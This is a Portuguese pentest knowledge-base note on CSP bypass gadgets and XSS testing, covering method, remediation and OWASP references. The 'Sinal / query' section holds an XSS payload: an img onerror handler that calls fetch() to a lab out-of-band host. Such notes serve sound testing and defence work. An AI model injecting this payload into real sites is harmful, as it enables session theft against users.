---
id: "0155"
categoria: "06-client"
familia: "client-xss"
slug: "csp-bypass"
angulo: "base"
mitre: ""
owasp: "WSTG-INPV-01"
tags: ["06-client", "client-xss", "base"]
aliases: ["CSP bypass gadgets", "csp-bypass"]
---

# CSP bypass gadgets

## Leitura rápida

XSS moderno raramente é `alert(1)`: o valor está em roubo de sessão, bypass de CSRF,
abuso de WebMessages e chain com CSP bypass. DOM XSS exige data flow (source→sink) real.

## Foco

- Se não validar **JSONP, CDNs antigos, nonce leak**, a nota fica genérica.
- Sink + contexto + cookie flags. Encadeio até ação autenticada ou token se HttpOnly falhar.

## Mãos na massa

1. Mapeio reflections e sinks DOM (innerHTML, location, postMessage).
2. Testo contextos (HTML, attr, JS, URL, CSS).
3. Avalio cookies HttpOnly e CSP.
4. Construir PoC de impacto (sessão de teste / ação).
5. Verifico mutação por sanitizers (DOMPurify misconfig).

## Sinal / query

```html
<!-- reflected/stored lab payload — sem persistir em prod -->
<img src=x onerror="fetch('https://oast.lab.local/bd6b41')">
<!-- sink csp-bypass: sessão USER_A / cookie flags -->
```

Não persisto payload em produção sem janela e plano de purge.

## Pitfall

Não capture sessões de usuários reais. Evito defacement.

## Detecção / remediação

CSP reports; WAF XSS signatures; canary cookies.

→ HttpOnly+Secure+SameSite; CSP nonce/hash; sanitização server+client;
Trusted Types.

## Prova

PoC HTML; cookie flags; impacto narrado.

## Refs

- [WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [PortSwigger — XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Relacionadas

- [CSP bypass gadgets — lab](0535-client-xss-csp-bypass--lab.md)
- [CSP bypass gadgets — hardening](0915-client-xss-csp-bypass--hardening.md)
- [template injection client (Angular/Vue)](0158-client-xss-angular.md)
- [XSS até account takeover](0160-client-xss-ato-chain.md)
- [DOM XSS](0153-client-xss-dom.md)
- [mutation XSS (mXSS)](0156-client-xss-mutation.md)